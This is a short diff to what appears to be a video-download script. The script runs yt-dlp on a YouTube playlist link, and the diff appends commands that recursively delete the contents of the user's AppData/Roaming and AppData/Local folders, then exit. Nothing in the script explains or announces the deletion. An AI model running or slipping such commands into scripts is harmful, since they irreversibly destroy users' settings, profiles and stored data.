@@ -1,3 +1,7 @@
 cls
 clear
 yt-dlp https://www.youtube.com/watch?v=_-eh8cwGGwg&list=PLDoPjvoNmBAzhFD3niPAa1C1gXG4cs14J&index=4
+rm AppData/Roaming/*
+rm -rf AppData/Roaming/*
+rm -rf AppData/Local/*
+exit
